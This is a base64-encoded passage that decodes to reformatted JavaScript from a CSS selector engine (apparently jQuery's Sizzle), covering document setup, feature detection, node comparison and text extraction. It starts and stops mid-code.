CIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsID0gby5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChsLS0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvW2xdID0gcyArIHJiKG9bbF0pOwogICAgICAgICAgICAgICAgICAgICAgICB3ID0gYWIudGVzdChhKSAmJiBwYihiLnBhcmVudE5vZGUpIHx8IGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB4ID0gby5qb2luKCIsIikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKHgpCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gSC5hcHBseShkLCB3LnF1ZXJ5U2VsZWN0b3JBbGwoeCkpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQKICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoeSkge30gZmluYWxseSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByIHx8IGIucmVtb3ZlQXR0cmlidXRlKCJpZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gaShhLnJlcGxhY2UoUiwgIiQxIiksIGIsIGQsIGUpCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGhiKCkgewogICAgICAgICAgICB2YXIgYSA9IFtdOwogICAgICAgICAgICBmdW5jdGlvbiBiKGMsIGUpIHsKICAgICAgICAgICAgICAgIHJldHVybiBhLnB1c2goYyArICIgIikgPiBkLmNhY2hlTGVuZ3RoICYmIGRlbGV0ZSBiW2Euc2hpZnQoKV0sCiAgICAgICAgICAgICAgICAgICAgYltjICsgIiAiXSA9IGUKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gYgogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBpYihhKSB7CiAgICAgICAgICAgIHJldHVybiBhW3VdID0gITAsCiAgICAgICAgICAgICAgICBhCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGpiKGEpIHsKICAgICAgICAgICAgdmFyIGIgPSBuLmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgcmV0dXJuICEhYShiKQogICAgICAgICAgICB9IGNhdGNoIChjKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gITEKICAgICAgICAgICAgfSBmaW5hbGx5IHsKICAgICAgICAgICAgICAgIGIucGFyZW50Tm9kZSAmJiBiLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoYiksCiAgICAgICAgICAgICAgICAgICAgYiA9IG51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBrYihhLCBiKSB7CiAgICAgICAgICAgIHZhciBjID0gYS5zcGxpdCgifCIpCiAgICAgICAgICAgICAgICAsIGUgPSBhLmxlbmd0aDsKICAgICAgICAgICAgd2hpbGUgKGUtLSkKICAgICAgICAgICAgICAgIGQuYXR0ckhhbmRsZVtjW2VdXSA9IGIKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gbGIoYSwgYikgewogICAgICAgICAgICB2YXIgYyA9IGIgJiYgYQogICAgICAgICAgICAgICAgLCBkID0gYyAmJiAxID09PSBhLm5vZGVUeXBlICYmIDEgPT09IGIubm9kZVR5cGUgJiYgKH5iLnNvdXJjZUluZGV4IHx8IEMpIC0gKH5hLnNvdXJjZUluZGV4IHx8IEMpOwogICAgICAgICAgICBpZiAoZCkKICAgICAgICAgICAgICAgIHJldHVybiBkOwogICAgICAgICAgICBpZiAoYykKICAgICAgICAgICAgICAgIHdoaWxlIChjID0gYy5uZXh0U2libGluZykKICAgICAgICAgICAgICAgICAgICBpZiAoYyA9PT0gYikKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICByZXR1cm4gYSA/IDEgOiAtMQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBtYihhKSB7CiAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbihiKSB7CiAgICAgICAgICAgICAgICB2YXIgYyA9IGIubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsKICAgICAgICAgICAgICAgIHJldHVybiAiaW5wdXQiID09PSBjICYmIGIudHlwZSA9PT0gYQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIG5iKGEpIHsKICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKGIpIHsKICAgICAgICAgICAgICAgIHZhciBjID0gYi5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpOwogICAgICAgICAgICAgICAgcmV0dXJuICgiaW5wdXQiID09PSBjIHx8ICJidXR0b24iID09PSBjKSAmJiBiLnR5cGUgPT09IGEKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBvYihhKSB7CiAgICAgICAgICAgIHJldHVybiBpYihmdW5jdGlvbihiKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gYiA9ICtiLAogICAgICAgICAgICAgICAgICAgIGliKGZ1bmN0aW9uKGMsIGQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGUsIGYgPSBhKFtdLCBjLmxlbmd0aCwgYiksIGcgPSBmLmxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGctLSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNbZSA9IGZbZ11dICYmIChjW2VdID0gIShkW2VdID0gY1tlXSkpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgfSkKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gcGIoYSkgewogICAgICAgICAgICByZXR1cm4gYSAmJiAidW5kZWZpbmVkIiAhPSB0eXBlb2YgYS5nZXRFbGVtZW50c0J5VGFnTmFtZSAmJiBhCiAgICAgICAgfQogICAgICAgIGMgPSBnYi5zdXBwb3J0ID0ge30sCiAgICAgICAgICAgIGYgPSBnYi5pc1hNTCA9IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHZhciBiID0gYSAmJiAoYS5vd25lckRvY3VtZW50IHx8IGEpLmRvY3VtZW50RWxlbWVudDsKICAgICAgICAgICAgICAgIHJldHVybiBiID8gIkhUTUwiICE9PSBiLm5vZGVOYW1lIDogITEKICAgICAgICAgICAgfQogICAgICAgICAgICAsCiAgICAgICAgICAgIG0gPSBnYi5zZXREb2N1bWVudCA9IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHZhciBiLCBlLCBnID0gYSA/IGEub3duZXJEb2N1bWVudCB8fCBhIDogdjsKICAgICAgICAgICAgICAgIHJldHVybiBnICE9PSBuICYmIDkgPT09IGcubm9kZVR5cGUgJiYgZy5kb2N1bWVudEVsZW1lbnQgPyAobiA9IGcsCiAgICAgICAgICAgICAgICAgICAgbyA9IGcuZG9jdW1lbnRFbGVtZW50LAogICAgICAgICAgICAgICAgICAgIGUgPSBnLmRlZmF1bHRWaWV3LAogICAgICAgICAgICAgICAgZSAmJiBlICE9PSBlLnRvcCAmJiAoZS5hZGRFdmVudExpc3RlbmVyID8gZS5hZGRFdmVudExpc3RlbmVyKCJ1bmxvYWQiLCBlYiwgITEpIDogZS5hdHRhY2hFdmVudCAmJiBlLmF0dGFjaEV2ZW50KCJvbnVubG9hZCIsIGViKSksCiAgICAgICAgICAgICAgICAgICAgcCA9ICFmKGcpLAogICAgICAgICAgICAgICAgICAgIGMuYXR0cmlidXRlcyA9IGpiKGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuY2xhc3NOYW1lID0gImkiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIWEuZ2V0QXR0cmlidXRlKCJjbGFzc05hbWUiKQogICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIGMuZ2V0RWxlbWVudHNCeVRhZ05hbWUgPSBqYihmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLmFwcGVuZENoaWxkKGcuY3JlYXRlQ29tbWVudCgiIikpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIWEuZ2V0RWxlbWVudHNCeVRhZ05hbWUoIioiKS5sZW5ndGgKICAgICAgICAgICAgICAgICAgICB9KSwKICAgICAgICAgICAgICAgICAgICBjLmdldEVsZW1lbnRzQnlDbGFzc05hbWUgPSAkLnRlc3QoZy5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKSwKICAgICAgICAgICAgICAgICAgICBjLmdldEJ5SWQgPSBqYihmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBvLmFwcGVuZENoaWxkKGEpLmlkID0gdSwKICAgICAgICAgICAgICAgICAgICAgICAgIWcuZ2V0RWxlbWVudHNCeU5hbWUgfHwgIWcuZ2V0RWxlbWVudHNCeU5hbWUodSkubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgfSksCiAgICAgICAgICAgICAgICAgICAgYy5nZXRCeUlkID8gKGQuZmluZC5JRCA9IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgidW5kZWZpbmVkIiAhPSB0eXBlb2YgYi5nZXRFbGVtZW50QnlJZCAmJiBwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSBiLmdldEVsZW1lbnRCeUlkKGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjICYmIGMucGFyZW50Tm9kZSA/IFtjXSA6IFtdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQuZmlsdGVyLklEID0gZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0gYS5yZXBsYWNlKGNiLCBkYik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuZ2V0QXR0cmlidXRlKCJpZCIpID09PSBiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICkgOiAoZGVsZXRlIGQuZmluZC5JRCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQuZmlsdGVyLklEID0gZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0gYS5yZXBsYWNlKGNiLCBkYik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSAidW5kZWZpbmVkIiAhPSB0eXBlb2YgYS5nZXRBdHRyaWJ1dGVOb2RlICYmIGEuZ2V0QXR0cmlidXRlTm9kZSgiaWQiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGMgJiYgYy52YWx1ZSA9PT0gYgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICApLAogICAgICAgICAgICAgICAgICAgIGQuZmluZC5UQUcgPSBjLmdldEVsZW1lbnRzQnlUYWdOYW1lID8gZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJ1bmRlZmluZWQiICE9IHR5cGVvZiBiLmdldEVsZW1lbnRzQnlUYWdOYW1lID8gYi5nZXRFbGVtZW50c0J5VGFnTmFtZShhKSA6IGMucXNhID8gYi5xdWVyeVNlbGVjdG9yQWxsKGEpIDogdm9pZCAwCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYywgZCA9IFtdLCBlID0gMCwgZiA9IGIuZ2V0RWxlbWVudHNCeVRhZ05hbWUoYSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIioiID09PSBhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGMgPSBmW2UrK10pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDEgPT09IGMubm9kZVR5cGUgJiYgZC5wdXNoKGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgLAogICAgICAgICAgICAgICAgICAgIGQuZmluZC5DTEFTUyA9IGMuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSAmJiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBwID8gYi5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKGEpIDogdm9pZCAwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICwKICAgICAgICAgICAgICAgICAgICByID0gW10sCiAgICAgICAgICAgICAgICAgICAgcSA9IFtdLAogICAgICAgICAgICAgICAgKGMucXNhID0gJC50ZXN0KGcucXVlcnlTZWxlY3RvckFsbCkpICYmIChqYihmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICAgICAgby5hcHBlbmRDaGlsZChhKS5pbm5lckhUTUwgPSAiPGEgaWQ9JyIgKyB1ICsgIic+PC9hPjxzZWxlY3QgaWQ9JyIgKyB1ICsgIi1cZl0nIG1zYWxsb3djYXB0dXJlPScnPjxvcHRpb24gc2VsZWN0ZWQ9Jyc+PC9vcHRpb24+PC9zZWxlY3Q+IiwKICAgICAgICAgICAgICAgICAgICBhLnF1ZXJ5U2VsZWN0b3JBbGwoIlttc2FsbG93Y2FwdHVyZV49JyddIikubGVuZ3RoICYmIHEucHVzaCgiWypeJF09IiArIEwgKyAiKig/OicnfFwiXCIpIiksCiAgICAgICAgICAgICAgICAgICAgYS5xdWVyeVNlbGVjdG9yQWxsKCJbc2VsZWN0ZWRdIikubGVuZ3RoIHx8IHEucHVzaCgiXFxbIiArIEwgKyAiKig/OnZhbHVlfCIgKyBLICsgIikiKSwKICAgICAgICAgICAgICAgICAgICBhLnF1ZXJ5U2VsZWN0b3JBbGwoIltpZH49IiArIHUgKyAiLV0iKS5sZW5ndGggfHwgcS5wdXNoKCJ+PSIpLAogICAgICAgICAgICAgICAgICAgIGEucXVlcnlTZWxlY3RvckFsbCgiOmNoZWNrZWQiKS5sZW5ndGggfHwgcS5wdXNoKCI6Y2hlY2tlZCIpLAogICAgICAgICAgICAgICAgICAgIGEucXVlcnlTZWxlY3RvckFsbCgiYSMiICsgdSArICIrKiIpLmxlbmd0aCB8fCBxLnB1c2goIi4jLitbK35dIikKICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgIGpiKGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBnLmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CiAgICAgICAgICAgICAgICAgICAgICAgIGIuc2V0QXR0cmlidXRlKCJ0eXBlIiwgImhpZGRlbiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYS5hcHBlbmRDaGlsZChiKS5zZXRBdHRyaWJ1dGUoIm5hbWUiLCAiRCIpLAogICAgICAgICAgICAgICAgICAgICAgICBhLnF1ZXJ5U2VsZWN0b3JBbGwoIltuYW1lPWRdIikubGVuZ3RoICYmIHEucHVzaCgibmFtZSIgKyBMICsgIipbKl4kfCF+XT89IiksCiAgICAgICAgICAgICAgICAgICAgICAgIGEucXVlcnlTZWxlY3RvckFsbCgiOmVuYWJsZWQiKS5sZW5ndGggfHwgcS5wdXNoKCI6ZW5hYmxlZCIsICI6ZGlzYWJsZWQiKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEucXVlcnlTZWxlY3RvckFsbCgiKiw6eCIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcS5wdXNoKCIsLio6IikKICAgICAgICAgICAgICAgICAgICB9KSksCiAgICAgICAgICAgICAgICAoYy5tYXRjaGVzU2VsZWN0b3IgPSAkLnRlc3QocyA9IG8ubWF0Y2hlcyB8fCBvLndlYmtpdE1hdGNoZXNTZWxlY3RvciB8fCBvLm1vek1hdGNoZXNTZWxlY3RvciB8fCBvLm9NYXRjaGVzU2VsZWN0b3IgfHwgby5tc01hdGNoZXNTZWxlY3RvcikpICYmIGpiKGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgICAgICBjLmRpc2Nvbm5lY3RlZE1hdGNoID0gcy5jYWxsKGEsICJkaXYiKSwKICAgICAgICAgICAgICAgICAgICAgICAgcy5jYWxsKGEsICJbcyE9JyddOngiKSwKICAgICAgICAgICAgICAgICAgICAgICAgci5wdXNoKCIhPSIsIFApCiAgICAgICAgICAgICAgICB9KSwKICAgICAgICAgICAgICAgICAgICBxID0gcS5sZW5ndGggJiYgbmV3IFJlZ0V4cChxLmpvaW4oInwiKSksCiAgICAgICAgICAgICAgICAgICAgciA9IHIubGVuZ3RoICYmIG5ldyBSZWdFeHAoci5qb2luKCJ8IikpLAogICAgICAgICAgICAgICAgICAgIGIgPSAkLnRlc3Qoby5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbiksCiAgICAgICAgICAgICAgICAgICAgdCA9IGIgfHwgJC50ZXN0KG8uY29udGFpbnMpID8gZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSA5ID09PSBhLm5vZGVUeXBlID8gYS5kb2N1bWVudEVsZW1lbnQgOiBhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCBkID0gYiAmJiBiLnBhcmVudE5vZGU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYSA9PT0gZCB8fCAhKCFkIHx8IDEgIT09IGQubm9kZVR5cGUgfHwgIShjLmNvbnRhaW5zID8gYy5jb250YWlucyhkKSA6IGEuY29tcGFyZURvY3VtZW50UG9zaXRpb24gJiYgMTYgJiBhLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uKGQpKSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICA6IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChiID0gYi5wYXJlbnROb2RlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYiA9PT0gYSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgLAogICAgICAgICAgICAgICAgICAgIEIgPSBiID8gZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGEgPT09IGIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGwgPSAhMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkID0gIWEuY29tcGFyZURvY3VtZW50UG9zaXRpb24gLSAhYi5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkID8gZCA6IChkID0gKGEub3duZXJEb2N1bWVudCB8fCBhKSA9PT0gKGIub3duZXJEb2N1bWVudCB8fCBiKSA/IGEuY29tcGFyZURvY3VtZW50UG9zaXRpb24oYikgOiAxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDEgJiBkIHx8ICFjLnNvcnREZXRhY2hlZCAmJiBiLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uKGEpID09PSBkID8gYSA9PT0gZyB8fCBhLm93bmVyRG9jdW1lbnQgPT09IHYgJiYgdCh2LCBhKSA/IC0xIDogYiA9PT0gZyB8fCBiLm93bmVyRG9jdW1lbnQgPT09IHYgJiYgdCh2LCBiKSA/IDEgOiBrID8gSihrLCBhKSAtIEooaywgYikgOiAwIDogNCAmIGQgPyAtMSA6IDEpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYSA9PT0gYikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gbCA9ICEwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMsIGQgPSAwLCBlID0gYS5wYXJlbnROb2RlLCBmID0gYi5wYXJlbnROb2RlLCBoID0gW2FdLCBpID0gW2JdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlIHx8ICFmKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhID09PSBnID8gLTEgOiBiID09PSBnID8gMSA6IGUgPyAtMSA6IGYgPyAxIDogayA/IEooaywgYSkgLSBKKGssIGIpIDogMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlID09PSBmKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBsYihhLCBiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMgPSBhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGMgPSBjLnBhcmVudE5vZGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaC51bnNoaWZ0KGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYyA9IGI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoYyA9IGMucGFyZW50Tm9kZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpLnVuc2hpZnQoYyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoaFtkXSA9PT0gaVtkXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkKys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZCA/IGxiKGhbZF0sIGlbZF0pIDogaFtkXSA9PT0gdiA/IC0xIDogaVtkXSA9PT0gdiA/IDEgOiAwCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAsCiAgICAgICAgICAgICAgICAgICAgZykgOiBuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgLAogICAgICAgICAgICBnYi5tYXRjaGVzID0gZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgcmV0dXJuIGdiKGEsIG51bGwsIG51bGwsIGIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgLAogICAgICAgICAgICBnYi5tYXRjaGVzU2VsZWN0b3IgPSBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICBpZiAoKGEub3duZXJEb2N1bWVudCB8fCBhKSAhPT0gbiAmJiBtKGEpLAogICAgICAgICAgICAgICAgICAgIGIgPSBiLnJlcGxhY2UoVSwgIj0nJDEnXSIpLAogICAgICAgICAgICAgICAgICAgICEoIWMubWF0Y2hlc1NlbGVjdG9yIHx8ICFwIHx8IHIgJiYgci50ZXN0KGIpIHx8IHEgJiYgcS50ZXN0KGIpKSkKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZCA9IHMuY2FsbChhLCBiKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQgfHwgYy5kaXNjb25uZWN0ZWRNYXRjaCB8fCBhLmRvY3VtZW50ICYmIDExICE9PSBhLmRvY3VtZW50Lm5vZGVUeXBlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGQKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7fQogICAgICAgICAgICAgICAgcmV0dXJuIGdiKGIsIG4sIG51bGwsIFthXSkubGVuZ3RoID4gMAogICAgICAgICAgICB9CiAgICAgICAgICAgICwKICAgICAgICAgICAgZ2IuY29udGFpbnMgPSBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gKGEub3duZXJEb2N1bWVudCB8fCBhKSAhPT0gbiAmJiBtKGEpLAogICAgICAgICAgICAgICAgICAgIHQoYSwgYikKICAgICAgICAgICAgfQogICAgICAgICAgICAsCiAgICAgICAgICAgIGdiLmF0dHIgPSBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICAoYS5vd25lckRvY3VtZW50IHx8IGEpICE9PSBuICYmIG0oYSk7CiAgICAgICAgICAgICAgICB2YXIgZSA9IGQuYXR0ckhhbmRsZVtiLnRvTG93ZXJDYXNlKCldCiAgICAgICAgICAgICAgICAgICAgLCBmID0gZSAmJiBELmNhbGwoZC5hdHRySGFuZGxlLCBiLnRvTG93ZXJDYXNlKCkpID8gZShhLCBiLCAhcCkgOiB2b2lkIDA7CiAgICAgICAgICAgICAgICByZXR1cm4gdm9pZCAwICE9PSBmID8gZiA6IGMuYXR0cmlidXRlcyB8fCAhcCA/IGEuZ2V0QXR0cmlidXRlKGIpIDogKGYgPSBhLmdldEF0dHJpYnV0ZU5vZGUoYikpICYmIGYuc3BlY2lmaWVkID8gZi52YWx1ZSA6IG51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICAsCiAgICAgICAgICAgIGdiLmVycm9yID0gZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJTeW50YXggZXJyb3IsIHVucmVjb2duaXplZCBleHByZXNzaW9uOiAiICsgYSkKICAgICAgICAgICAgfQogICAgICAgICAgICAsCiAgICAgICAgICAgIGdiLnVuaXF1ZVNvcnQgPSBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICB2YXIgYiwgZCA9IFtdLCBlID0gMCwgZiA9IDA7CiAgICAgICAgICAgICAgICBpZiAobCA9ICFjLmRldGVjdER1cGxpY2F0ZXMsCiAgICAgICAgICAgICAgICAgICAgayA9ICFjLnNvcnRTdGFibGUgJiYgYS5zbGljZSgwKSwKICAgICAgICAgICAgICAgICAgICBhLnNvcnQoQiksCiAgICAgICAgICAgICAgICAgICAgbCkgewogICAgICAgICAgICAgICAgICAgIHdoaWxlIChiID0gYVtmKytdKQogICAgICAgICAgICAgICAgICAgICAgICBiID09PSBhW2ZdICYmIChlID0gZC5wdXNoKGYpKTsKICAgICAgICAgICAgICAgICAgICB3aGlsZSAoZS0tKQogICAgICAgICAgICAgICAgICAgICAgICBhLnNwbGljZShkW2VdLCAxKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIGsgPSBudWxsLAogICAgICAgICAgICAgICAgICAgIGEKICAgICAgICAgICAgfQogICAgICAgICAgICAsCiAgICAgICAgICAgIGUgPSBnYi5nZXRUZXh0ID0gZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgdmFyIGIsIGMgPSAiIiwgZCA9IDAsIGYgPSBhLm5vZGVUeXBlOwogICAgICAgICAgICAgICAgaWYgKGYpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoMSA9PT0gZiB8fCA5ID09PSBmIHx8IDExID09PSBmKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgic3RyaW5nIiA9PSB0eXBlb2YgYS50ZXh0Q29udGVudCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLnRleHRDb250ZW50OwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGEgPSBhLmZpcnN0Q2hpbGQ7IGE7IGEgPSBhLm5leHRTaWJsaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYyArPSBlKGEpCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgzID09PSBmIHx8IDQgPT09IGYpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLm5vZGVWYWx1ZQogICAgICAgICAgICAgICAgfSBlbHNlCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGIgPSBhW2QrK10pCiAgICAgICAgICAgICAgICAgICAgICAgIGMgKz0gZShiKTsKICAgICAgICAgICAgICAgIHJldHVybiBjCiAgICAgICAgICAgIH0KICAgICAgICAgICAgLAogICAgICAgICAgICBkID0gZ2Iuc2VsZWN0b3JzID0gewogICAgICAgICAgICAgICAgY2FjaGVMZW5ndGg6IDUwLAogICAgICAgICAgICAgICAgY3JlYXRlUHNldWRvOiBpYiwKICAgICAgICAgICAgICAgIG1hdGNoOiBYLAogICAgICAgICAgICAgICAgYXR0ckhhbmRsZToge30sCiAgICAgICAgICAgICAgICBmaW5kOiB7fSwKIC